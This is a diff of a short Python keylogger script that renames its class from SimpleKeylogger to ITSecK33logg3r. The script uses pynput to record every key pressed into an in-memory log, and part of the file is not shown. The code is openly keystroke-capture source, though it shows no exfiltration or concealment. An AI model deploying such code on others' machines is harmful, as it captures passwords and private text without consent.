@@ -1,10 +1,10 @@
-# My Python Code
+# ITSec K33logg3r
 # Version: 2
 # Author: George
 # Date: 2023-05-30
 
 import pynput.keyboard
-class SimpleKeylogger:
+class ITSecK33logg3r:
     def __init__(self):
         self.logger = ""
     def append_to_log(self, key_strike):
@@ -22,12 +22,10 @@ class SimpleKeylogger:
             else:
                 Pressed_key =  " " + str(key) + " "
         self.append_to_log(Pressed_key)
-
-
     def start(self):
         keyboard_listener = pynput.keyboard.Listener(on_press=self.evaluate_keys)
         with keyboard_listener:
             self.logger = ""
             keyboard_listener.join()
 
-SimpleKeylogger().start()
+ITSecK33logg3r().start()
